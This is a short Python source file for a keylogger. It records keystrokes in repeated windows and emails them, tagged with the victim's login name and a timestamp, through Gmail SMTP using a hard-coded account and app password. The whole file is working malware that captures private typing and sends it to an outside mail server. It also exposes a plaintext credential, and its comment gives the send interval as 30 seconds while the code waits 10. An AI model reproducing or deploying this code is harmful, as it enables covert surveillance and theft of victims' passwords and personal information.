# Keylogger with mail exfiltration every 30 seconds
from smtplib import SMTP_SSL as SMTP
import keyboard
from datetime import datetime
import os
import time

while True:
    keystrokes_list = []
    keyboard.start_recording()
    time.sleep(10)
    events = keyboard.stop_recording()
    for event in events:
        if event.event_type == keyboard.KEY_DOWN:
            keystrokes_list.append(event.name)
            
    # If no keys were logged, do not send email and continue listening
    if (len(keystrokes_list) == 0):
        continue
            
    # ---------------- EMAIL EXFILTRATION -------------------
    SMTPserver = 'smtp.gmail.com'
    sender =     'testemail6841@gmail.com'
    destination = ['testemail6841@gmail.com']
    data = " ".join(keystrokes_list)

    USERNAME = "testemail6841@gmail.com"
    PASSWORD = "lsov clug ypdp cbjt" # App Password from gmail
    
    dt = datetime.now().astimezone()
    timestamp = f"{dt.strftime("%a %d %b %Y, %I:%M%p")} {dt.tzname()}"
                
    from email.mime.text import MIMEText
    msg = MIMEText(data, 'plain')
    msg['Subject']= f'{os.getlogin()}: {timestamp}'
    msg['From'] = sender # some SMTP servers will do this automatically, not 

    with SMTP('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(USERNAME, PASSWORD)
        smtp_server.sendmail(sender, destination, msg.as_string())